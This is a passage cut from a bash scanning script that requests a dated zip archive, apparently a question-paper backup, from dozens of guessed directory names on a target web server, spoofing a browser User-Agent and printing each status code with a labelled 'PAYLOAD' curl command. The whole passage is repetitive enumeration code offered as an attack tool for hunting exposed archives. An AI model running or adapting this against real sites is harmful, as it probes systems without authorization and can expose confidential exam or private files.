${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile-Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Transfer-QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Transfer-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Transfer-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Dashboard_QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Dashboard_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Dashboard_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessorQPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessorQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessorQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool_QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool_QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool_QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control_TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessor-QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessor-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessor-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModuleQPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModuleQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModuleQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload-Uploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload-Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload-Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlerQPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlerQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlerQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperAutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperAutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperAutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaperDataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaperDataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaperDataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling_QPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling_QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling_QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper-DataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSyncQPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSyncQPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSyncQPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor_FileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor_FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor_FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SyncQPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SyncQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SyncQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Transfer-QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Transfer-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Transfer-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [System-QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}System-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}System-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload-QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUpload-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PlatformQPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PlatformQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PlatformQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling_QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P-AccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P-AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P-AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystem_QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystem_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystem_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Upload-QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Upload-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Upload-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper_Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt_QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper_ProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper_ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper_ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOpsQuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOpsQuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOpsQuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PlatformQPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PlatformQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PlatformQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control-QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin_QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader_UploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader_UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader_UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadQPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync-QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster_AutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster_AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster_AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_DataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite-QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SuiteQPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SuiteQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SuiteQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl-Handler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
